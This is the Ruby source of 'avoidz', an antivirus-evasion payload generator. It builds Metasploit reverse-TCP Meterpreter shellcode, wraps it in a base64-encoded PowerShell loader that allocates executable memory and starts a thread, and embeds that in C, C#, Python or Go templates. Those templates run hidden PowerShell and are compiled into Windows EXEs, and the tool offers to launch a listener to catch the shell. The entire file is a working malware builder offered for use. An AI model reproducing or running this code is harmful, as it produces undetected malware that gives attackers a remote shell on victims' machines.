#!/usr/bin/ruby
#
# avoidz A.V bypass tool . version 1.3
#
# Generate encoded powershell with metasploit payloads,convert C, C#, py & go to EXE's format
#
#                  Created By Mascerano Bachir .
#                 Website: http://www.dev-labs.co
#           YTB : https://www.youtube.com/c/mascerano%20bachir  
#        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
#
# this is an open source tool if you want to modify or add something . Please give me a copy.
         

require 'colorize'
require 'artii'
require 'optparse'
require 'base64'
puts ""
puts ""
puts " By Mascerano Bachir | version 1.3 [Dev-labs]".light_blue
puts ""
a = Artii::Base.new :font => 'basic'
puts a.asciify('avoidz').light_blue


options = {}

optparse = OptionParser.new do|opts|

    opts.banner = "Usage: avoidz.rb [options]"
    opts.separator ""
    
    options[:lhost] = "127.0.0.1"
    options[:lport] = "4444"
    options[:payload] = "windows/meterpreter/reverse_tcp"
    options[:output] = "exe"

    opts.on('-h', '--lhost value', "ip_addr|default = 127.0.0.1") do |h|
        options[:lhost] = h
    end
    
    opts.on('-p', '--lport value', "port_number|default = 4444") do |p|
                options[:lport] = p
        end
    
    opts.on('-m', '--payload value', "payload to use|default = windows/meterpreter/reverse_tcp") do |m|
                options[:payload] = m
        end

    opts.on('-f', '--format value', "output format: c1, c2, cs, py, go") do |f|
                options[:output] = f
        end
    opts.separator ""
end

if ARGV.empty?
  puts optparse
  exit
else
  optparse.parse!
end

$lhost = options[:lhost]
$lport = options[:lport]
$lpayload = options[:payload]
$loutput = options[:output]

#string byte to hex
class String
  def to_hex
    #"0x" + self.to_i.to_s(16)
    sprintf("0x%02x", self.to_i)
  end
end

def gen_PS_shellcode()

    results = []
    resultsS = ""
    puts "\n\n[*] generating raw payload......".yellow
    #generate the shellcode via msfvenom and write to a temp txt file
    system("msfvenom -p #{$lpayload} lhost=#{$lhost} lport=#{$lport} --platform windows -a x86 -e cmd/powershell_base64 -i 3 --smallest -s 341 -f raw -o raw_shellcode_temp > /dev/null 2>&1")
    #taking raw shellcode, each byte goes into array
    File.open('raw_shellcode_temp').each_byte do |b|
        results << b
    end

    #remove temp
    system("rm raw_shellcode_temp")

    #go through the array, convert each byte in the array to a hex string
    results.each do |i|
        resultsS = resultsS + i.to_s.to_hex + ","
    end

    #remove last unnecessary comma
    resultsS = resultsS.chop

   
    #powershell script to be executed pre-encode
    finstring = "$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{resultsS};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";$cmd = \"-nop -noni -enc \";iex \"& $x86 $cmd $gq\"}else{$cmd = \"-nop -noni -enc\";iex \"& powershell $cmd $gq\";}"

    #convert to UTF-16 (powershell interprets base64 of UTF-16)
    ec = Encoding::Converter.new("UTF-8", "UTF-16LE")
    utfEncoded =  ec.convert(finstring)

    #string to base64 - final
    finPS = Base64.encode64(utfEncoded).gsub(/\n/, '')
    
    return finPS
end


def prep_PS_chunk(ps_shellcode)
    #The below iterates through the string and chops up strings into 254 character lengths & puts it into a 2-dimensional array   
    splitup = []
    splitup = ps_shellcode.scan(/.{1,254}/)

    stringCommands=""
    varFinal="stringFinal=stringA+stringB+"

    splitup = splitup.flatten  #make the 2-dimensional array 1-dimensional to easier iterate
    splitup.each_with_index do |val, index|   #cycle through the array and create the strings for VBA
        val=val.tr '"',''  #strip out any prior quotes in the command
        stringCommands = stringCommands+"string#{index}=\"#{val}\"\n"
        varFinal=varFinal+"string#{index}+"
    end

    varFinal=varFinal[0..-2]  #create the final command that will be executed, this removes the "+" sign from the last command
    return stringCommands + "\n" + varFinal
end 

b = Artii::Base.new :font => 'slant'
puts b.asciify('generate').light_red

#/////////////////////CREATE_C1_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
if $loutput == "c1"

#determine if MinGW has been installed, support new and old MinGW system paths
mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
if mingw == false
    puts "[*] You must have MinGW-32 installed in order to compile EXEs!!".red
    puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
    exit 1
end

    powershell_encoded = gen_PS_shellcode()

c1TEMPLATE = %{#include <stdio.h>
#include <windows.h>
int shellCode(){
	system("color 63");
	system("powershell.exe -nop -win Hidden -noni -enc #{powershell_encoded}"); 
	/*
		((Shell Code into the console))
	*/
	return 0;
}
void hide(){
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow (stealth,0);
}
int main(){
	hide();
	shellCode();
	return 0;
}
}

#write out to a new file
c_file_temp = File.new("c_file_temp.c", "w")
c_file_temp.write(c1TEMPLATE)
c_file_temp.close
   
#compiling will require MinGW installed - "apt-get install mingw32"
puts "\n[*] compiling to exe......".yellow

system("i586-mingw32msvc-gcc c_file_temp.c -o /root/c1.exe -lws2_32 -mwindows")
system("rm c_file_temp.c")

puts "----------------------------------------------".light_blue
puts "[*] payload exec generated in /root/c1.exe [*]".light_blue
puts "----------------------------------------------".light_blue

puts "\n[*] Would you like to start a listener? (Y/n)".yellow
msf_bool = $stdin.gets.chomp
msf_bool = msf_bool.upcase
if msf_bool == 'Y'
        system("service postgresql start")
        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n set exitonsession false;\n set enablestageencoding true;\n exploit -j -z'")
else
		puts ""
		puts options
		puts "\n\n Good Bye!".yellow
	end
end
#/////////////////////CREATE_C2_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
if $loutput == "c2"

#determine if MinGW has been installed, support new and old MinGW system paths
mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
if mingw == false
    puts "[*] You must have MinGW-32 installed in order to compile EXEs!!".red	
    puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
    exit 1
end

    powershell_encoded = gen_PS_shellcode()

c2TEMPLATE = %{#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <aclapi.h>
#include <shlobj.h>
#include <windows.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
int main(int argc, char *argv[])
{
FreeConsole();
 ShellExecute( NULL,NULL, "powershell.exe", "powershell -nop -win Hidden -noni -enc #{powershell_encoded}",NULL,NULL);
exit(0);
}
}


#write out to a new file
c_file_temp = File.new("c_file_temp.c", "w")
c_file_temp.write(c2TEMPLATE)
c_file_temp.close

#compiling will require MinGW installed - "apt-get install mingw32"
puts "\n[*] compiling to exe......".yellow

system("i586-mingw32msvc-gcc c_file_temp.c -o /root/c2.exe -lws2_32 -mwindows > /dev/null 2>&1")
system("rm c_file_temp.c")

puts "----------------------------------------------".light_blue
puts "[*] payload exec generated in /root/c2.exe [*]".light_blue
puts "----------------------------------------------".light_blue

puts "\n[*] Would you like to start a listener? (Y/n)".yellow
msf_bool = $stdin.gets.chomp
msf_bool = msf_bool.upcase
if msf_bool == 'Y'
        system("service postgresql start")
        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n set exitonsession false;\n set enablestageencoding true;\n exploit -j -z'")
else
		puts ""
		puts options
		puts "\n\n Good Bye!".yellow
	end
end
#/////////////////////CREATE_CS_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
if $loutput == "cs"

#determine if Monodevelop has been installed .
mingw = true if File::exists?('/usr/lib/monodevelop') || File::exists?('/usr/bin/monodevelop')
if mingw == false
    puts "[*] You must have Monodevelop installed in order to compile EXEs!!".red	
    puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
    exit 1
end

    powershell_encoded = gen_PS_shellcode()

csTEMPLATE = %{// C#
using System.Runtime.InteropServices;
namespace pshcmd
{
	public class CMD
	{
		[DllImport("msvcrt.dll")]
		public static extern int system(string cmd);
		public static void Main()
		{
			system("powershell.exe -nop -win Hidden -noni -enc #{powershell_encoded}");
		}
	}
}
}


#write out to a new file
c_file_temp = File.new("c_file_temp.c", "w")
c_file_temp.write(csTEMPLATE)
c_file_temp.close

#compiling will require Monodevelop installed - "apt-get install monodevelop"
puts "\n[*] compiling to exe......".yellow

system("mcs c_file_temp.c -out:/root/cs.exe")
system("rm c_file_temp.c")

puts "----------------------------------------------".light_blue
puts "[*] payload exec generated in /root/cs.exe [*]".light_blue
puts "----------------------------------------------".light_blue

puts "\n[*] Would you like to start a listener? (Y/n)".yellow
msf_bool = $stdin.gets.chomp
msf_bool = msf_bool.upcase
if msf_bool == 'Y'
        system("service postgresql start")
        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n set exitonsession false;\n set enablestageencoding true;\n exploit -j -z'")
else
		puts ""
		puts options
		puts "\n\n Good Bye!".yellow
	end
end
#/////////////////////CREATE_PY_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
if $loutput == "py"

#determine if Wine has been installed .
mingw = true if File::exists?('/usr/lib/wine') || File::exists?('/usr/bin/wine')
if mingw == false
    puts "[*] You must have Wine installed in order to compile python to EXEs!!".red	
    puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
    exit 1
end

    powershell_encoded = gen_PS_shellcode()

pyTEMPLATE = %{import os
os.system("powershell.exe -nop -win Hidden -noni -enc #{powershell_encoded}")
}


#write out to a new file
c_file_temp = File.new("c_file_temp.py", "w")
c_file_temp.write(pyTEMPLATE)
c_file_temp.close

#compiling will require Wine installed - "sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine:i386"
puts "\n[*] compiling to exe......".yellow

system("wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -F c_file_temp.py > /dev/null 2>&1")
system("cp dist/c_file_temp.exe /root/py.exe")
system("rm c_file_temp.py")
system("rm c_file_temp.spec")
system("rm -r build")
system("rm -r dist")

puts "----------------------------------------------".light_blue
puts "[*] payload exec generated in /root/py.exe [*]".light_blue
puts "----------------------------------------------".light_blue

puts "\n[*] Would you like to start a listener? (Y/n)".yellow
msf_bool = $stdin.gets.chomp
msf_bool = msf_bool.upcase
if msf_bool == 'Y'
        system("service postgresql start")
        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n set exitonsession false;\n set enablestageencoding true;\n exploit -j -z'")
else
		puts ""
		puts options
		puts "\n\n Good Bye!".yellow
	end
end
#/////////////////////CREATE_GO_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
if $loutput == "go"

#determine if golang has been installed .
mingw = true if File::exists?('/usr/lib/go') || File::exists?('/usr/bin/go')
if mingw == false
    puts "[*] You must have Golang installed in order to compile to EXEs!!".red	
    puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
    exit 1
end

    powershell_encoded = gen_PS_shellcode()

goTEMPLATE = %{package main

import "os/exec"

func main() {

    cmd := exec.Command("powershell.exe", "-nop", "-win", "Hidden", "-noni", "-enc", "#{powershell_encoded}")
    stdout, err := cmd.Output()

    if err != nil {
        println(err.Error())
        return
    }

    print(string(stdout))
}
}



#write out to a new file
c_file_temp = File.new("c_file_temp.go", "w")
c_file_temp.write(goTEMPLATE)
c_file_temp.close

#compiling will require Golang installed - "apt-get install golang"
puts "\n[*] compiling to exe......".yellow

system("export GOOS=windows && export GOARCH=386 && go build -ldflags -H=windowsgui c_file_temp.go")
system("mv c_file_temp.exe /root/go.exe")
system("rm c_file_temp.go")

puts "----------------------------------------------".light_blue
puts "[*] payload exec generated in /root/go.exe [*]".light_blue
puts "----------------------------------------------".light_blue

puts "\n[*] Would you like to start a listener? (Y/n)".yellow
msf_bool = $stdin.gets.chomp
msf_bool = msf_bool.upcase
if msf_bool == 'Y'
        system("service postgresql start")
        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n set exitonsession false;\n set enablestageencoding true;\n exploit -j -z'")
else
		puts ""
		puts options
		puts "\n\n Good Bye!".yellow
	end
end
